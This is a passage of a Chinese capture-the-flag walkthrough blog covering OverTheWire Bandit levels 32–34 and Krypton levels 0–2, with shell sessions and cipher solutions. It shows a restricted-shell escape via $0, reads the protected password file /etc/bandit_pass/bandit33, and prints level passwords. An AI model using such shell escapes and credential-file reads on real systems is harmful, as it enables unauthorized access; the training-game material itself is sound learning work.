class="line">               </span><br><span class="line">              </span><br><span class="line">Welcome to OverTheWire!</span><br><span class="line"></span><br><span class="line">If you find any problems, please report them to Steven or morla on</span><br><span class="line">irc.overthewire.org.</span><br><span class="line"></span><br><span class="line">--[ Playing the games ]--</span><br><span class="line"></span><br><span class="line">  This machine might hold several wargames. </span><br><span class="line">  If you are playing <span class="string">"somegame"</span>, <span class="keyword">then</span>:</span><br><span class="line"></span><br><span class="line">    * USERNAMES are somegame0, somegame1, ...</span><br><span class="line">    * Most LEVELS are stored <span class="keyword">in</span> /somegame/.</span><br><span class="line">    * PASSWORDS <span class="keyword">for</span> each level are stored <span class="keyword">in</span> /etc/somegame_pass/.</span><br><span class="line"></span><br><span class="line">  Write-access to homedirectories is disabled. It is advised to create a</span><br><span class="line">  working directory with a hard-to-guess name <span class="keyword">in</span> /tmp/.  You can use the</span><br><span class="line">  <span class="built_in">command</span> <span class="string">"mktemp -d"</span> <span class="keyword">in</span> order to generate a random and hard to guess</span><br><span class="line">  directory <span class="keyword">in</span> /tmp/.  Read-access to both /tmp/ and /proc/ is disabled</span><br><span class="line">  so that users can not snoop on eachother. Files and directories with </span><br><span class="line">  easily guessable or short names will be periodically deleted!</span><br><span class="line">4</span><br><span class="line">  Please play nice:</span><br><span class="line">      </span><br><span class="line">    * don<span class="string">'t leave orphan processes running</span></span><br><span class="line"><span class="string">    * don'</span>t leave exploit-files laying around</span><br><span class="line">    * don<span class="string">'t annoy other players</span></span><br><span class="line"><span class="string">    * don'</span>t post passwords or spoilers</span><br><span class="line">    * again, DONT POST SPOILERS! </span><br><span class="line">      This includes writeups of your solution on your blog or website!</span><br><span class="line"></span><br><span class="line">--[ Tips ]--</span><br><span class="line"></span><br><span class="line">  This machine has a 64bit processor and many security-features enabled</span><br><span class="line">  by default, although ASLR has been switched off.  The following</span><br><span class="line">  compiler flags might be interesting:</span><br><span class="line"></span><br><span class="line">    -m32                    compile <span class="keyword">for</span> 32bit</span><br><span class="line">    -fno-stack-protector    <span class="built_in">disable</span> ProPolice</span><br><span class="line">    -Wl,-z,norelro          <span class="built_in">disable</span> relro </span><br><span class="line"></span><br><span class="line">  In addition, the execstack tool can be used to flag the stack as</span><br><span class="line">  executable on ELF binaries.</span><br><span class="line"></span><br><span class="line">  Finally, network-access is limited <span class="keyword">for</span> most levels by a <span class="built_in">local</span></span><br><span class="line">  firewall.</span><br><span class="line"></span><br><span class="line">--[ Tools ]--</span><br><span class="line"></span><br><span class="line"> For your convenience we have installed a few usefull tools <span class="built_in">which</span> you can find</span><br><span class="line"> <span class="keyword">in</span> the following locations:</span><br><span class="line"></span><br><span class="line">    * pwndbg (https://github.com/pwndbg/pwndbg) <span class="keyword">in</span> /usr/<span class="built_in">local</span>/pwndbg/</span><br><span class="line">    * peda (https://github.com/longld/peda.git) <span class="keyword">in</span> /usr/<span class="built_in">local</span>/peda/</span><br><span class="line">    * gdbinit (https://github.com/gdbinit/Gdbinit) <span class="keyword">in</span> /usr/<span class="built_in">local</span>/gdbinit/</span><br><span class="line">    * pwntools (https://github.com/Gallopsled/pwntools)</span><br><span class="line">    * radare2 (http://www.radare.org/)</span><br><span class="line">    * checksec.sh (http://www.trapkit.de/tools/checksec.html) <span class="keyword">in</span> /usr/<span class="built_in">local</span>/bin/checksec.sh</span><br><span class="line"></span><br><span class="line">--[ More information ]--</span><br><span class="line"></span><br><span class="line">  For more information regarding individual wargames, visit</span><br><span class="line">  http://www.overthewire.org/wargames/</span><br><span class="line"></span><br><span class="line">  For support, questions or comments, contact us through IRC on</span><br><span class="line">  irc.overthewire.org <span class="comment">#wargames.</span></span><br><span class="line"></span><br><span class="line">  Enjoy your stay!</span><br><span class="line"></span><br><span class="line">WELCOME TO THE UPPERCASE SHELL</span><br><span class="line">&gt;&gt; <span class="comment">#!/bin/sh</span></span><br><span class="line">&gt;&gt; bash</span><br><span class="line">sh: 1: BASH: not found</span><br><span class="line">&gt;&gt; man</span><br><span class="line">sh: 1: MAN: not found</span><br><span class="line">&gt;&gt; sh</span><br><span class="line">sh: 1: SH: not found</span><br><span class="line">&gt;&gt; <span class="variable">$0</span></span><br><span class="line">$ ls</span><br><span class="line">uppershell</span><br><span class="line">$ id</span><br><span class="line">uid=11033(bandit33) gid=11032(bandit32) groups=11032(bandit32)</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/home/bandit32</span><br><span class="line">$ cat /etc/bandit_pass/bandit32</span><br><span class="line">cat: /etc/bandit_pass/bandit32: Permission denied</span><br><span class="line">$ cat /etc/bandit_pass/bandit33</span><br><span class="line">c9c3199ddf4121b10cf581a98d51caee</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>这关是真的骚，Linux中大小写严格区分，导致我们的命令都执行不了</p><p>后来看题解得知<code>$0</code>可以直接进入<code>sh</code>，然后就可以了woc</p><p>还有一个题解是利用ssh协议，传一个bash脚本(如下)，放在tmp文件夹下，用大写文件名<code>./TEST</code>逃逸，然后执行bash，不过还是没有上面这个办法简单暴力</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">bash</span><br></pre></td></tr></table></figure><h3 id="level-34"><a href="#level-34" class="headerlink" title="level 34"></a>level 34</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">bl@bl-virtual-machine:~/wargame$ ssh bandit33@bandit.labs.overthewire.org -p 2220 </span><br><span class="line">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span><br><span class="line"></span><br><span class="line">bandit33@bandit.labs.overthewire.org<span class="string">'s password: </span></span><br><span class="line"><span class="string">Linux bandit 4.18.12 x86_64 GNU/Linux</span></span><br><span class="line"><span class="string">               </span></span><br><span class="line"><span class="string">      ,----..            ,----,          .---. </span></span><br><span class="line"><span class="string">     /   /   \         ,/   .`|         /. ./|</span></span><br><span class="line"><span class="string">    /   .     :      ,`   .'</span>  :     .--<span class="string">'.  '</span> ;</span><br><span class="line">   .   /   ;.  \   ;    ;     /    /__./ \ : |</span><br><span class="line">  .   ;   /  ` ; .<span class="string">'___,/    ,'</span> .--<span class="string">'.  '</span>   \<span class="string">' .</span></span><br><span class="line"><span class="string">  ;   |  ; \ ; | |    :     | /___/ \ |    '</span> <span class="string">' </span></span><br><span class="line"><span class="string">  |   :  | ; | '</span> ;    |.<span class="string">';  ; ;   \  \;      : </span></span><br><span class="line"><span class="string">  .   |  '</span> <span class="string">' '</span> : `----<span class="string">'  |  |  \   ;  `      |</span></span><br><span class="line"><span class="string">  '</span>   ;  \; /  |     <span class="string">'   :  ;   .   \    .\  ; </span></span><br><span class="line"><span class="string">   \   \  '</span>,  /      |   |  <span class="string">'    \   \   '</span> \ |</span><br><span class="line">    ;   :    /       <span class="string">'   :  |     :   '</span>  |--<span class="string">"  </span></span><br><span class="line"><span class="string">     \   \ .'        ;   |.'       \   \ ;     </span></span><br><span class="line"><span class="string">  www. `---` ver     '---' he       '---"</span> ire.org     </span><br><span class="line">               </span><br><span class="line">              </span><br><span class="line">Welcome to OverTheWire!</span><br><span class="line"></span><br><span class="line">If you find any problems, please report them to Steven or morla on</span><br><span class="line">irc.overthewire.org.</span><br><span class="line"></span><br><span class="line">--[ Playing the games ]--</span><br><span class="line"></span><br><span class="line">  This machine might hold several wargames. </span><br><span class="line">  If you are playing <span class="string">"somegame"</span>, <span class="keyword">then</span>:</span><br><span class="line"></span><br><span class="line">    * USERNAMES are somegame0, somegame1, ...</span><br><span class="line">    * Most LEVELS are stored <span class="keyword">in</span> /somegame/.</span><br><span class="line">    * PASSWORDS <span class="keyword">for</span> each level are stored <span class="keyword">in</span> /etc/somegame_pass/.</span><br><span class="line"></span><br><span class="line">  Write-access to homedirectories is disabled. It is advised to create a</span><br><span class="line">  working directory with a hard-to-guess name <span class="keyword">in</span> /tmp/.  You can use the</span><br><span class="line">  <span class="built_in">command</span> <span class="string">"mktemp -d"</span> <span class="keyword">in</span> order to generate a random and hard to guess</span><br><span class="line">  directory <span class="keyword">in</span> /tmp/.  Read-access to both /tmp/ and /proc/ is disabled</span><br><span class="line">  so that users can not snoop on eachother. Files and directories with </span><br><span class="line">  easily guessable or short names will be periodically deleted!</span><br><span class="line">4</span><br><span class="line">  Please play nice:</span><br><span class="line">      </span><br><span class="line">    * don<span class="string">'t leave orphan processes running</span></span><br><span class="line"><span class="string">    * don'</span>t leave exploit-files laying around</span><br><span class="line">    * don<span class="string">'t annoy other players</span></span><br><span class="line"><span class="string">    * don'</span>t post passwords or spoilers</span><br><span class="line">    * again, DONT POST SPOILERS! </span><br><span class="line">      This includes writeups of your solution on your blog or website!</span><br><span class="line"></span><br><span class="line">--[ Tips ]--</span><br><span class="line"></span><br><span class="line">  This machine has a 64bit processor and many security-features enabled</span><br><span class="line">  by default, although ASLR has been switched off.  The following</span><br><span class="line">  compiler flags might be interesting:</span><br><span class="line"></span><br><span class="line">    -m32                    compile <span class="keyword">for</span> 32bit</span><br><span class="line">    -fno-stack-protector    <span class="built_in">disable</span> ProPolice</span><br><span class="line">    -Wl,-z,norelro          <span class="built_in">disable</span> relro </span><br><span class="line"></span><br><span class="line">  In addition, the execstack tool can be used to flag the stack as</span><br><span class="line">  executable on ELF binaries.</span><br><span class="line"></span><br><span class="line">  Finally, network-access is limited <span class="keyword">for</span> most levels by a <span class="built_in">local</span></span><br><span class="line">  firewall.</span><br><span class="line"></span><br><span class="line">--[ Tools ]--</span><br><span class="line"></span><br><span class="line"> For your convenience we have installed a few usefull tools <span class="built_in">which</span> you can find</span><br><span class="line"> <span class="keyword">in</span> the following locations:</span><br><span class="line"></span><br><span class="line">    * pwndbg (https://github.com/pwndbg/pwndbg) <span class="keyword">in</span> /usr/<span class="built_in">local</span>/pwndbg/</span><br><span class="line">    * peda (https://github.com/longld/peda.git) <span class="keyword">in</span> /usr/<span class="built_in">local</span>/peda/</span><br><span class="line">    * gdbinit (https://github.com/gdbinit/Gdbinit) <span class="keyword">in</span> /usr/<span class="built_in">local</span>/gdbinit/</span><br><span class="line">    * pwntools (https://github.com/Gallopsled/pwntools)</span><br><span class="line">    * radare2 (http://www.radare.org/)</span><br><span class="line">    * checksec.sh (http://www.trapkit.de/tools/checksec.html) <span class="keyword">in</span> /usr/<span class="built_in">local</span>/bin/checksec.sh</span><br><span class="line"></span><br><span class="line">--[ More information ]--</span><br><span class="line"></span><br><span class="line">  For more information regarding individual wargames, visit</span><br><span class="line">  http://www.overthewire.org/wargames/</span><br><span class="line"></span><br><span class="line">  For support, questions or comments, contact us through IRC on</span><br><span class="line">  irc.overthewire.org <span class="comment">#wargames.</span></span><br><span class="line"></span><br><span class="line">  Enjoy your stay!</span><br><span class="line"></span><br><span class="line">bandit33@bandit:~$ ls</span><br><span class="line">README.txt</span><br><span class="line">bandit33@bandit:~$ cat README.txt </span><br><span class="line">Congratulations on solving the last level of this game!</span><br><span class="line"></span><br><span class="line">At this moment, there are no more levels to play <span class="keyword">in</span> this game. However, we are constantly working</span><br><span class="line">on new levels and will most likely expand this game with more levels soon.</span><br><span class="line">Keep an eye out <span class="keyword">for</span> an announcement on our usual communication channels!</span><br><span class="line">In the meantime, you could play some of our other wargames.</span><br><span class="line"></span><br><span class="line">If you have an idea <span class="keyword">for</span> an awesome new level, please <span class="built_in">let</span> us know!</span><br><span class="line">bandit33@bandit:~$</span><br></pre></td></tr></table></figure><p>只有一个<code>README.txt</code>，恭喜完结撒花</p><p>截图纪念一下</p><p><img src="https://magic-king.net/images/loading.gif" data-original="CTF-Wargame/bandit_end.png" alt></p><blockquote><p>以下是后面找到的一些题解</p><p><a href="https://blog.csdn.net/winkar/article/details/38408873?locationNum=5&amp;fps=1" target="_blank" rel="noopener">https://blog.csdn.net/winkar/article/details/38408873?locationNum=5&amp;fps=1</a></p><p><a href="https://www.freebuf.com/column/181443.html" target="_blank" rel="noopener">https://www.freebuf.com/column/181443.html</a></p><p><a href="https://www.jianshu.com/p/bf8cc6b0efd1" target="_blank" rel="noopener">https://www.jianshu.com/p/bf8cc6b0efd1</a></p></blockquote><hr><h2 id="Krypton"><a href="#Krypton" class="headerlink" title="Krypton"></a>Krypton</h2><blockquote><p>SSH Information<br>Host: krypton.labs.overthewire.org<br>Port: 2222</p></blockquote><h3 id="level-0"><a href="#level-0" class="headerlink" title="level 0"></a>level 0</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Welcome <span class="keyword">to</span> Krypton! The first level is easy. The following string encodes the password using Base64:</span><br><span class="line"></span><br><span class="line">S1JZUFRPTklTR1JFQVQ=</span><br><span class="line">Use this password <span class="keyword">to</span> log <span class="keyword">in</span> <span class="keyword">to</span> krypton.labs.overthewire.org with username krypton1 using SSH on<span class="built_in"> port </span>2222. You can <span class="builtin-name">find</span> the files <span class="keyword">for</span> other levels <span class="keyword">in</span> /krypton/</span><br></pre></td></tr></table></figure><p>啊这熟悉的开头，简单的base64编码</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">KRYPTONISGREAT</span></span><br></pre></td></tr></table></figure><p>解码得到如上flag</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$ ssh krypton1@krypton.labs.overthewire.org -p 2222</span><br><span class="line">The authenticity of host <span class="string">'[krypton.labs.overthewire.org]:2222 ([176.9.9.172]:2222)'</span> can<span class="string">'t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:SCySwNrZFEHArEX1cAlnnaJ5gz2O8VEigY9X80nFWUU.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added '</span>[krypton.labs.overthewire.org]:2222,[176.9.9.172]:2222<span class="string">' (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string"> _                     _</span></span><br><span class="line"><span class="string">| | ___ __ _   _ _ __ | |_ ___  _ __</span></span><br><span class="line"><span class="string">| |/ / '</span>__| | | | <span class="string">'_ \| __/ _ \| '</span>_ \</span><br><span class="line">|   &lt;| |  | |_| | |_) | || (_) | | | |</span><br><span class="line">|_|\_\_|   \__, | .__/ \__\___/|_| |_|</span><br><span class="line">           |___/|_|</span><br><span class="line">a http://www.overthewire.org wargame.</span><br><span class="line"></span><br><span class="line">krypton1@krypton.labs.overthewire.org<span class="string">'s password:</span></span><br><span class="line"><span class="string">Permission denied, please try again.</span></span><br><span class="line"><span class="string">krypton1@krypton.labs.overthewire.org'</span>s password:</span><br><span class="line">Permission denied, please try again.</span><br><span class="line">krypton1@krypton.labs.overthewire.org<span class="string">'s password:</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 14.04 LTS (GNU/Linux 4.4.0-92-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Ubuntu system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span></span><br><span class="line"><span class="string">applicable law.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">krypton1@krypton:~$</span></span><br></pre></td></tr></table></figure><p>成功连上level1</p><h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">krypton1@krypton:~$ ls -al</span><br><span class="line">total 24</span><br><span class="line">drwxr-xr-x  3 krypton1 krypton1 4096 Feb 27 11:03 .</span><br><span class="line">drwxr-xr-x 10 root     root     4096 Feb 27 11:03 ..</span><br><span class="line">-rw-r--r--  1 krypton1 krypton1  220 Apr  9  2014 .bash_logout</span><br><span class="line">-rw-r--r--  1 krypton1 krypton1 3637 Apr  9  2014 .bashrc</span><br><span class="line">drwx------  2 krypton1 krypton1 4096 Feb 27 11:03 .cache</span><br><span class="line">-rw-r--r--  1 krypton1 krypton1  675 Apr  9  2014 .profile</span><br><span class="line">krypton1@krypton:~$ <span class="built_in">cd</span> /krypton/</span><br><span class="line">krypton1@krypton:/krypton$ ls</span><br><span class="line">krypton1  krypton2  krypton3  krypton4  krypton5  krypton6</span><br><span class="line">krypton1@krypton:/krypton$ ls krypton1</span><br><span class="line">README  krypton2</span><br><span class="line">krypton1@krypton:/krypton$ cat krypton1/README</span><br><span class="line">Welcome to Krypton!</span><br><span class="line"></span><br><span class="line">This game is intended to give hands on experience with cryptography</span><br><span class="line">and cryptanalysis.  The levels progress from classic ciphers, to modern,</span><br><span class="line">easy to harder.</span><br><span class="line"></span><br><span class="line">Although there are excellent public tools, like cryptool,to perform</span><br><span class="line">the simple analysis, we strongly encourage you to try and <span class="keyword">do</span> these</span><br><span class="line">without them <span class="keyword">for</span> now.  We will use them <span class="keyword">in</span> later excercises.</span><br><span class="line"></span><br><span class="line">** Please try these levels without cryptool first **</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The first level is easy.  The password <span class="keyword">for</span> level 2 is <span class="keyword">in</span> the file</span><br><span class="line"><span class="string">'krypton2'</span>.  It is <span class="string">'encrypted'</span> using a simple rotation called ROT13.</span><br><span class="line">It is also <span class="keyword">in</span> non-standard ciphertext format.  When using alpha characters <span class="keyword">for</span></span><br><span class="line">cipher text it is normal to group the letters into 5 letter clusters,</span><br><span class="line">regardless of word boundaries.  This helps obfuscate any patterns.</span><br><span class="line"></span><br><span class="line">This file has kept the plain text word boundaries and carried them to</span><br><span class="line">the cipher text.</span><br><span class="line"></span><br><span class="line">Enjoy!</span><br><span class="line">krypton1@krypton:/krypton$ cat krypton1/krypton2</span><br><span class="line">YRIRY GJB CNFFJBEQ EBGGRA</span><br><span class="line">krypton1@krypton:/krypton$</span><br></pre></td></tr></table></figure><p>通过README可知，简单的ROT13加密</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">LEVEL TWO PASSWORD ROTTEN</span></span><br></pre></td></tr></table></figure><p>进入下一关</p><h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">krypton2@krypton:~$ ls</span><br><span class="line">krypton2@krypton:~$ <span class="built_in">cd</span> /krypton/</span><br><span class="line">krypton2@krypton:/krypton$ <span class="built_in">cd</span> krypton2</span><br><span class="line">krypton2@krypton:/krypton/krypton2$ ls</span><br><span class="line">README  encrypt  keyfile.dat  krypton3</span><br><span class="line">krypton2@krypton:/krypton/krypton2$ cat README</span><br><span class="line">Krypton 2</span><br><span class="line"></span><br><span class="line">ROT13 is a simple substitution cipher.</span><br><span class="line"></span><br><span class="line">Substitution ciphers are a simple replacement algorithm.  In this example</span><br><span class="line">of a substitution cipher, we will explore a <span class="string">'monoalphebetic'</span> cipher.</span><br><span class="line">Monoalphebetic means, literally, <span class="string">"one alphabet"</span> and you will see why.</span><br><span class="line"></span><br><span class="line">This level contains an old form of cipher called a <span class="string">'Caesar Cipher'</span>.</span><br><span class="line">A Caesar cipher shifts the alphabet by a <span class="built_in">set</span> number.  For example:</span><br><span class="line"></span><br><span class="line">plain:  a b c d e f g h i j k ...</span><br><span class="line">cipher: G H I J K L M N O P Q ...</span><br><span class="line"></span><br><span class="line">In this example, the letter <span class="string">'a'</span> <span class="keyword">in</span> plaintext is replaced by a <span class="string">'G'</span> <span class="keyword">in</span> the</span><br><span class="line">ciphertext so, <span class="keyword">for</span> example, the plaintext <span class="string">'bad'</span> becomes <span class="string">'HGJ'</span> <span class="keyword">in</span> ciphertext.</span><br><span class="line"></span><br><span class="line">The password <span class="keyword">for</span> level 3 is <span class="keyword">in</span> the file krypton3.  It is <span class="keyword">in</span> 5 letter</span><br><span class="line">group ciphertext.  It is encrypted with a Caesar Cipher.  Without any</span><br><span class="line">further information, this cipher text may be difficult to <span class="built_in">break</span>.  You <span class="keyword">do</span></span><br><span class="line">not have direct access to the key, however you <span class="keyword">do</span> have access to a program</span><br><span class="line">that will encrypt anything you wish to give it using the key.</span><br><span class="line">If you think logically, this is completely easy.</span><br><span class="line"></span><br><span class="line">One shot can solve it!</span><br><span class="line"></span><br><span class="line">Have fun.</span><br><span class="line"></span><br><span class="line">Additional Information:</span><br><span class="line"></span><br><span class="line">The `encrypt` binary will look <span class="keyword">for</span> the keyfile <span class="keyword">in</span> your current working</span><br><span class="line">directory. Therefore, it might be best to create a working direcory <span class="keyword">in</span> /tmp</span><br><span class="line">and <span class="keyword">in</span> there a link to the keyfile. As the `encrypt` binary runs setuid</span><br><span class="line">`krypton3`, you also need to give `krypton3` access to your working directory.</span><br><span class="line"></span><br><span class="line">Here is an example:</span><br><span class="line"></span><br><span class="line">krypton2@melinda:~$ mktemp -d</span><br><span class="line">/tmp/tmp.Wf2OnCpCDQ</span><br><span class="line">krypton2@melinda:~$ <span class="built_in">cd</span> /tmp/tmp.Wf2OnCpCDQ</span><br><span class="line">krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ln -s /krypton/krypton2/keyfile.dat</span><br><span class="line">krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ls</span><br><span class="line">keyfile.dat</span><br><span class="line">krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ chmod 777 .</span><br><span class="line">krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ /krypton/krypton2/encrypt /etc/issue</span><br><span class="line">krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ls</span><br><span class="line">ciphertext  keyfile.dat</span><br><span class="line"></span><br><span class="line">krypton2@krypton:/krypton/krypton2$</span><br><span class="line">krypton2@krypton:/krypton/krypton2$ mktemp -d</span><br><span class="line">/tmp/tmp.fz9I1hQd5d</span><br><span class="line">krypton2@krypton:/krypton/krypton2$ <span class="built_in">cd</span> /tmp/tmp.fz9I1hQd5d</span><br><span class="line">krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ ln -s /krypton/krypton2/keyfile.dat </span><br><span class="line">krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ ls</span><br><span class="line">keyfile.dat</span><br><span class="line">krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ chmod 777 .</span><br><span class="line">krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ /krypton/krypton2/encrypt /etc/issue  </span><br><span class="line">krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ ls</span><br><span class="line">ciphertext  keyfile.dat</span><br><span class="line">krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ cat ciphertext </span><br><span class="line">GNGZFGXFEZX</span><br><span class="line">krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ cat keyfile.dat </span><br><span class="line">cat: keyfile.dat: Permission denied</span><br><span class="line">krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ ls -al</span><br><span class="line">total 12</span><br><span class="line">drwxrwxrwx 2 krypton2 krypton2 4096 Feb 27 11:19 .</span><br><span class="line">drwxrwx-wt 3 root     root     4096 Feb 27 11:20 ..</span><br><span class="line">-rw-rw-r-- 1 krypton3 krypton2   11 Feb 27 11:19 ciphertext</span><br><span class="line">lrwxrwxrwx 1 krypton2 krypton2   29 Feb 27 11:18 keyfile.dat -&gt; /krypton/krypton2/keyfile.dat</span><br><span class="line">krypton2@krypton:/tmp/tmp.fz9I1hQd5d$</span><br></pre></td></tr></table></figure><p>将密文<code>GNGZFGXFEZX</code>进行凯撒位移</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 